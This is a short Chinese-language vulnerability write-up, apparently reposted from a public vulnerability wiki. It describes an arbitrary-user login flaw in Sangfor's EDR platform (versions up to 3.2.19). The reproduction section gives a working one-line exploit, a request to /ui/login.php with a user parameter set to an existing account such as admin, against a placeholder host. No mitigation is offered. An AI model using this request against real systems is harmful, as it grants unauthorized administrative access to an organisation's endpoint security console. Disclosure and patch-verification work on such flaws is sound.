---
title: "深信服 EDR 后台任意用户登陆漏洞"
date: 2026-10-16 09:11:01
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "漏洞复现"
---
## 漏洞描述

深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，登录任意用户

## 漏洞影响

```
EDR <= v3.2.19
```

## 漏洞复现

https://xxx.xxx.xxx.xxx/ui/login.php?user=admin

注意最后的admin需要为存在的用户名

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091912509.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-EDR-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E.md)
